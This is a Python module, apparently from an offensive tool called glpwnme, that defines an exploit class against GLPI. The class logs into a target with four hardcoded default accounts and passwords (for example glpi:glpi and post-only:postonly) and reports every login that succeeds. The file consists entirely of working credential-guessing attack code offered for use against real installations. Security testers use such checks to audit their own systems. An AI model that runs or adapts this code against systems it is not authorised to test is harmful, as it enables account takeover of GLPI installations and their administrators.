from http import HTTPStatus
from ..exploit import GlpiExploit
from glpwnme.exploits.utils import GlpiUtils
from glpwnme.exploits.logger import Log

class DEFAULT_PASSWORD_CHECK(GlpiExploit):
    """
    This class just test for the default credentials of the account

    @author glpi
    @cvss 6.0
    @name DEFAULT_PASSWORD_CHECK
    """
    _impacts = "Authentication Bypass"
    _is_check_opsec_safe = False # Check is not opsec safe as it try to login 4 times
    default_credentials = {"glpi": "glpi",
                           "tech": "tech",
                           "normal": "normal",
                           "post-only": "postonly"}

    def check(self):
        """
        Check if the target is vulnerable

        :return: Whether or not the exploit succeeded
        :rtype: bool
        """
        are_account_valid = False
        for username, password in self.default_credentials.items():
            if self.glpi_session.login(username, password, others={"auth":"local"}):
                Log.msg(f"Authentication successfull for {username}:{password}")
                are_account_valid = True
                self.glpi_session.logout()
        return are_account_valid

    def run(self):
        """
        Run the exploit on the target, this actually is the same as the check
        """
        are_account_valid = False
        for username, password in self.default_credentials.items():
            if self.glpi_session.login(username, password, others={"auth":"local"}):
                Log.msg(f"Authentication successfull for {username}:{password}")
                are_account_valid = True
                self.glpi_session.logout()
            else:
                Log.err(f"Authentication failed for {username}:{password}")
        return are_account_valid
